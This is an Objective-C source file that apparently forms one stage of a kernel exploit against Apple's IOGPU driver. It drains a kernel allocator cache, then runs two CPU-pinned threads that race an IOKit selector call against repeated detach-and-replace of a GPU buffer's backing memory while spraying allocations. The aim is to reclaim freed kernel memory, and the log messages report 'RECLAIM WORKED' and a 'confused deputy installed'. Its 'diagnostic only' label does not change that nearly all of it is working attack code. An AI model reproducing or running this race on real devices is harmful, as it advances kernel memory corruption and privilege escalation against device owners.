//
//  P020v2MagazineDrain.m
//  P007OpenOnly
//
//  p020v2: drain ALLOC magazine on the target CPU, then same-CPU
//  sel36 vs detach+replace+churn. Mapped to p020 IOGPU/Metal helpers.
//  Not KRW. Diagnostic only.
//

#import "P020v2MagazineDrain.h"

#import <Metal/Metal.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <mach/thread_act.h>
#import <mach/thread_policy.h>
#import <objc/message.h>
#import <objc/runtime.h>
#import <pthread.h>
#import <stdarg.h>
#import <stdatomic.h>
#import <stdio.h>
#import <string.h>
#import <unistd.h>

#define P020V2_DRAIN_COUNT   128
#define P020V2_RACE_SECONDS  60
#define P020V2_SPRAY_RING    256
#define P020V2_SPRAY_LEN     0x400
#define P020V2_PAGE          0x4000
#define P020V2_HIST          8

typedef int (*P020v2Detach_t)(void *);
typedef int (*P020v2Replace_t)(void *, void *, uint64_t);
typedef uint32_t (*P020v2GetType_t)(void *);
typedef uint32_t (*P020v2GetConn_t)(void *);
typedef kern_return_t (*P020v2Iocall_t)(
    mach_port_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);

typedef struct {
    unsigned kr;
    unsigned long long n;
} p020v2_kh;

typedef struct {
    uint64_t v;
    unsigned long long n;
} p020v2_oh;

static NSMutableString *p020v2_buf;
static int p020v2_fd = -1;

static void p020v2_log(const char *fmt, ...)
{
    char lb[800];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(lb, sizeof(lb) - 1, fmt, ap);
    va_end(ap);
    if (n < 0)
        return;
    if (n > (int)sizeof(lb) - 2)
        n = (int)sizeof(lb) - 2;
    lb[n++] = '\n';
    lb[n] = 0;
    @synchronized ([NSString class]) {
        if (p020v2_buf)
            [p020v2_buf appendFormat:@"%.*s", n, lb];
        if (p020v2_fd >= 0) {
            write(p020v2_fd, lb, (size_t)n);
            fcntl(p020v2_fd, F_FULLFSYNC);
        }
    }
}

static NSString *p020v2_finish(void)
{
    if (p020v2_fd >= 0) {
        fcntl(p020v2_fd, F_FULLFSYNC);
        close(p020v2_fd);
        p020v2_fd = -1;
    }
    return p020v2_buf ?: @"STOP: no log";
}

static const char *p020v2_kr(kern_return_t r)
{
    unsigned u = (unsigned)r;
    if (r == 0)
        return "SUCCESS";
    if (u == 0xe00002c2)
        return "BadArgument";
    if (u == 0xe00002bc)
        return "Error";
    return "?";
}

static id p020v2_unwrap(id buf)
{
    for (int i = 0; i < 8; i++) {
        NSString *cn = NSStringFromClass([buf class]);
        if (![cn containsString:@"Capture"] && ![cn containsString:@"Debug"])
            break;
        SEL s = NSSelectorFromString(@"baseObject");
        if (![buf respondsToSelector:s])
            break;
        id b = ((id (*)(id, SEL))objc_msgSend)(buf, s);
        if (!b || b == buf)
            break;
        buf = b;
    }
    return buf;
}

static void *p020v2_ref(id buf)
{
    buf = p020v2_unwrap(buf);
    SEL s = NSSelectorFromString(@"resourceRef");
    if (![buf respondsToSelector:s])
        return NULL;
    return ((void *(*)(id, SEL))objc_msgSend)(buf, s);
}

static void *p020v2_ivar(id obj, const char *name)
{
    if (!obj || !name)
        return NULL;
    Class cls = object_getClass(obj);
    while (cls) {
        unsigned int n = 0;
        Ivar *ivs = class_copyIvarList(cls, &n);
        void *val = NULL;
        for (unsigned i = 0; i < n; i++) {
            const char *nm = ivar_getName(ivs[i]);
            if (nm && strcmp(nm, name) == 0) {
                val = *(void **)((char *)(__bridge void *)obj + ivar_getOffset(ivs[i]));
                break;
            }
        }
        free(ivs);
        if (val)
            return val;
        cls = class_getSuperclass(cls);
    }
    return NULL;
}

static void *p020v2_strip(void *p)
{
    return (void *)((uintptr_t)p & 0x0000007FFFFFFFFFULL);
}

static int p020v2_is_heap(void *p)
{
    uintptr_t x = (uintptr_t)p020v2_strip(p);
    if (x < 0x100000000ULL)
        return 0;
    if ((x & 7) != 0)
        return 0;
    if ((x >> 28) == 0x16)
        return 0;
    return 1;
}

static uint32_t p020v2_res_id(void *res)
{
    if (!res)
        return 0;
    return *(uint32_t *)((uint8_t *)res + 0x30);
}

static uint32_t p020v2_res_conn(void *res)
{
    if (!res)
        return 0;
    void *devw = p020v2_strip(*(void **)((uint8_t *)res + 0x10));
    if (!p020v2_is_heap(devw))
        return 0;
    return *(uint32_t *)((uint8_t *)devw + 0x14);
}

static void p020v2_hist_kr(p020v2_kh *h, unsigned kr)
{
    @synchronized ([NSString class]) {
        for (int i = 0; i < P020V2_HIST; i++) {
            if (h[i].n && h[i].kr == kr) {
                h[i].n++;
                return;
            }
            if (h[i].n == 0) {
                h[i].kr = kr;
                h[i].n = 1;
                return;
            }
        }
        h[P020V2_HIST - 1].n++;
    }
}

static void p020v2_hist_out(p020v2_oh *h, uint64_t v)
{
    @synchronized ([NSString class]) {
        for (int i = 0; i < P020V2_HIST; i++) {
            if (h[i].n && h[i].v == v) {
                h[i].n++;
                return;
            }
            if (h[i].n == 0) {
                h[i].v = v;
                h[i].n = 1;
                return;
            }
        }
        h[P020V2_HIST - 1].n++;
    }
}

static int p020v2_nsout(p020v2_oh *h)
{
    int n = 0;
    for (int i = 0; i < P020V2_HIST && h[i].n; i++)
        n++;
    return n;
}

static void p020v2_pin(int tag)
{
    thread_affinity_policy_data_t pol;
    pol.affinity_tag = tag;
    (void)thread_policy_set(pthread_mach_thread_np(pthread_self()),
                            THREAD_AFFINITY_POLICY,
                            (thread_policy_t)&pol,
                            THREAD_AFFINITY_POLICY_COUNT);
}

static id p020v2_create80(id dev, P020v2GetType_t getType, vm_size_t vmsz, NSUInteger len,
                          vm_address_t *out_pg, void **out_ref)
{
    *out_pg = 0;
    *out_ref = NULL;
    vm_address_t pg = 0;
    if (vm_allocate(mach_task_self(), &pg, vmsz, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !pg)
        return nil;
    size_t fill = (size_t)len;
    if (fill > (size_t)vmsz)
        fill = (size_t)vmsz;
    memset((void *)(uintptr_t)pg, 0xEE, fill);
    id buf = [dev newBufferWithBytesNoCopy:(void *)(uintptr_t)pg
                                    length:len
                                   options:MTLResourceStorageModeShared
                               deallocator:^(void *p, NSUInteger n) {
                                   (void)p;
                                   (void)n;
                               }];
    void *r = buf ? p020v2_ref(buf) : NULL;
    uint32_t t = (r && getType) ? getType(r) : 0;
    if (!buf || !r || t != 0x80) {
        buf = nil;
        vm_deallocate(mach_task_self(), pg, vmsz);
        return nil;
    }
    *out_pg = pg;
    *out_ref = r;
    return buf;
}

typedef struct {
    void *ref;
    P020v2Detach_t detach;
    P020v2Replace_t repl;
    P020v2Iocall_t iocall;
    mach_port_t conn;
    uint32_t id;
    void *repl_page;
    size_t repl_len;
    __unsafe_unretained id spray_dev;
    P020v2GetType_t getType;
    atomic_int *stop;
    atomic_ullong *itersA;
    atomic_ullong *itersB;
    atomic_ullong *krSuccess;
    atomic_ullong *krBadArg;
    atomic_ullong *krOther;
    p020v2_kh *kh;
    p020v2_oh *oh;
} p020v2_arg;

static void *p020v2_threadA(void *u)
{
    p020v2_arg *st = (p020v2_arg *)u;
    p020v2_pin(1);
    uint64_t in[3] = { st->id, 0, 0x1000 };
    while (!atomic_load(st->stop)) {
        uint64_t out = 0;
        uint32_t nout = 1;
        kern_return_t kr = st->iocall(st->conn, 36, in, 3, NULL, 0, &out, &nout, NULL, NULL);
        p020v2_hist_kr(st->kh, (unsigned)kr);
        if (kr == 0) {
            p020v2_hist_out(st->oh, out);
            atomic_fetch_add(st->krSuccess, 1);
        } else if ((unsigned)kr == 0xe00002c2) {
            atomic_fetch_add(st->krBadArg, 1);
        } else {
            atomic_fetch_add(st->krOther, 1);
        }
        atomic_fetch_add(st->itersA, 1);
    }
    return NULL;
}

static void *p020v2_threadB(void *u)
{
    p020v2_arg *st = (p020v2_arg *)u;
    p020v2_pin(1);
    NSMutableArray *ring = [NSMutableArray arrayWithCapacity:P020V2_SPRAY_RING];
    vm_address_t pgs[P020V2_SPRAY_RING];
    memset(pgs, 0, sizeof(pgs));
    int slot = 0;
    while (!atomic_load(st->stop)) {
        @autoreleasepool {
            if (st->detach(st->ref) != 0)
                continue;
            if (st->repl(st->ref, st->repl_page, st->repl_len) != 0)
                continue;
            for (int c = 0; c < 4; c++) {
                vm_address_t pg = 0;
                void *r = NULL;
                id b = p020v2_create80(st->spray_dev, st->getType, P020V2_PAGE, P020V2_SPRAY_LEN,
                                       &pg, &r);
                if (!b)
                    continue;
                if ((int)ring.count == P020V2_SPRAY_RING) {
                    [ring replaceObjectAtIndex:(NSUInteger)slot withObject:b];
                    if (pgs[slot])
                        vm_deallocate(mach_task_self(), pgs[slot], P020V2_PAGE);
                } else {
                    [ring addObject:b];
                }
                pgs[slot] = pg;
                slot = (slot + 1) % P020V2_SPRAY_RING;
            }
            atomic_fetch_add(st->itersB, 1);
        }
    }
    (void)ring;
    return NULL;
}

@implementation P020v2MagazineDrain

+ (NSString *)runP020v2MagazineDrain
{
    p020v2_buf = [NSMutableString string];
    NSArray<NSString *> *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [docs.firstObject stringByAppendingPathComponent:@"p020v2_magazine_drain_log.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
    p020v2_fd = open(path.fileSystemRepresentation, O_WRONLY | O_CREAT | O_TRUNC, 0644);

    p020v2_log("=== p020v2 session: magazine-drain reclaim race ===");
    p020v2_log("[*] Fix: drain ALLOC before race, same-CPU A+B (tag 1)");
    p020v2_log("[*] 0x9857cc8 = missed reclaim (still)");
    p020v2_log("[*] 0x9857cd8 = PAC passed — RECLAIM WORKED");
    p020v2_log("[*] no panic  = silent win or race never hit");
    p020v2_log("[*] NOT KRW. Diagnostic only.");
    fcntl(p020v2_fd, F_FULLFSYNC);

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu)
        iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iogpu) {
        p020v2_log("p020v2 STOP dlopen IOGPU");
        return p020v2_finish();
    }

    P020v2Detach_t detach = (P020v2Detach_t)dlsym(iogpu, "IOGPUResourceDetachBacking");
    P020v2Replace_t repl = (P020v2Replace_t)dlsym(iogpu, "IOGPUResourceReplaceBackingWithBytes");
    P020v2GetType_t getType = (P020v2GetType_t)dlsym(iogpu, "IOGPUResourceGetResourceType");
    P020v2GetConn_t devConn = (P020v2GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    P020v2Iocall_t iocall = iokit ? (P020v2Iocall_t)dlsym(iokit, "IOConnectCallMethod") : NULL;
    if (!detach || !repl || !iocall || !getType) {
        p020v2_log("p020v2 STOP syms");
        return p020v2_finish();
    }

    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) {
        p020v2_log("p020v2 STOP no device");
        return p020v2_finish();
    }
    id mtlDev = p020v2_unwrap(dev);
    void *devRef = p020v2_strip(p020v2_ivar(mtlDev, "_deviceRef"));
    uint32_t dconn = (devConn && p020v2_is_heap(devRef)) ? devConn(devRef) : 0;

    vm_address_t pg = 0, pr = 0;
    void *ref = NULL;
    id buf = p020v2_create80(dev, getType, P020V2_PAGE, P020V2_PAGE, &pg, &ref);
    if (!buf || !ref) {
        p020v2_log("p020v2 [0] STOP no type 0x80");
        return p020v2_finish();
    }
    if (vm_allocate(mach_task_self(), &pr, P020V2_PAGE, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !pr) {
        p020v2_log("p020v2 [0] STOP replace page");
        return p020v2_finish();
    }
    memset((void *)(uintptr_t)pr, 0x43, P020V2_PAGE);

    uint32_t rid = p020v2_res_id(ref);
    uint32_t rconn = p020v2_res_conn(ref);
    uint32_t conn = dconn ? dconn : rconn;
    p020v2_log("p020v2 [0] dconn=0x%x id=%u", conn, rid);
    if (!conn || !rid) {
        p020v2_log("p020v2 STOP conn/id");
        return p020v2_finish();
    }
    fcntl(p020v2_fd, F_FULLFSYNC);

    uint64_t cin[3] = { rid, 0, 0x1000 };
    uint64_t cout = 0;
    uint32_t nout = 1;
    kern_return_t ckr = iocall(conn, 36, cin, 3, NULL, 0, &cout, &nout, NULL, NULL);
    p020v2_log("p020v2 [calib] sel36 kr=0x%x (%s) sout=0x%llx",
               (unsigned)ckr, p020v2_kr(ckr), (unsigned long long)cout);
    fcntl(p020v2_fd, F_FULLFSYNC);
    if (ckr != 0) {
        p020v2_log("p020v2 STOP calib failed");
        return p020v2_finish();
    }

    NSMutableArray *drain = [NSMutableArray array];
    vm_address_t drain_pg[P020V2_DRAIN_COUNT];
    memset(drain_pg, 0, sizeof(drain_pg));
    int nd = 0;
    for (int i = 0; i < P020V2_DRAIN_COUNT; i++) {
        vm_address_t wpg = 0;
        void *wr = NULL;
        id wb = p020v2_create80(dev, getType, P020V2_PAGE, P020V2_PAGE, &wpg, &wr);
        if (!wb)
            continue;
        [drain addObject:wb];
        drain_pg[nd++] = wpg;
    }
    [drain removeAllObjects];
    for (int i = 0; i < nd; i++) {
        if (drain_pg[i])
            vm_deallocate(mach_task_self(), drain_pg[i], P020V2_PAGE);
    }
    p020v2_log("p020v2 [drain] created+destroyed %d — ALLOC empty, FREE full", nd);
    fcntl(p020v2_fd, F_FULLFSYNC);

    p020v2_kh kh[P020V2_HIST];
    p020v2_oh oh[P020V2_HIST];
    memset(kh, 0, sizeof(kh));
    memset(oh, 0, sizeof(oh));
    atomic_int stop = 0;
    atomic_ullong ia = 0, ib = 0, k0 = 0, k2c2 = 0, koth = 0;

    p020v2_arg a;
    memset(&a, 0, sizeof(a));
    a.ref = ref;
    a.detach = detach;
    a.repl = repl;
    a.iocall = iocall;
    a.conn = conn;
    a.id = rid;
    a.repl_page = (void *)(uintptr_t)pr;
    a.repl_len = P020V2_PAGE;
    a.spray_dev = dev;
    a.getType = getType;
    a.stop = &stop;
    a.itersA = &ia;
    a.itersB = &ib;
    a.krSuccess = &k0;
    a.krBadArg = &k2c2;
    a.krOther = &koth;
    a.kh = kh;
    a.oh = oh;
    p020v2_arg b = a;

    pthread_t tA, tB;
    if (pthread_create(&tA, NULL, p020v2_threadA, &a) != 0 ||
        pthread_create(&tB, NULL, p020v2_threadB, &b) != 0) {
        atomic_store(&stop, 1);
        p020v2_log("p020v2 STOP pthread");
        return p020v2_finish();
    }

    for (int t = 0; t < P020V2_RACE_SECONDS; t += 5) {
        sleep(5);
        p020v2_log("p020v2 [race] t=%ds A=%llu B=%llu kr={0x0:%llu 2c2:%llu other:%llu} souts=%d",
                   t + 5,
                   (unsigned long long)atomic_load(&ia),
                   (unsigned long long)atomic_load(&ib),
                   (unsigned long long)atomic_load(&k0),
                   (unsigned long long)atomic_load(&k2c2),
                   (unsigned long long)atomic_load(&koth),
                   p020v2_nsout(oh));
        fcntl(p020v2_fd, F_FULLFSYNC);
    }

    atomic_store(&stop, 1);
    pthread_join(tA, NULL);
    pthread_join(tB, NULL);

    p020v2_log("p020v2 verdict: SURVIVED %ds A=%llu B=%llu souts=%d",
               P020V2_RACE_SECONDS,
               (unsigned long long)atomic_load(&ia),
               (unsigned long long)atomic_load(&ib),
               p020v2_nsout(oh));
    p020v2_log("p020v2 note: 0x9857cd8 = RECLAIM WORKED. Silent + new sout = confused deputy installed.");
    fcntl(p020v2_fd, F_FULLFSYNC);

    buf = nil;
    if (pg)
        vm_deallocate(mach_task_self(), pg, P020V2_PAGE);
    if (pr)
        vm_deallocate(mach_task_self(), pr, P020V2_PAGE);
    return p020v2_finish();
}

@end
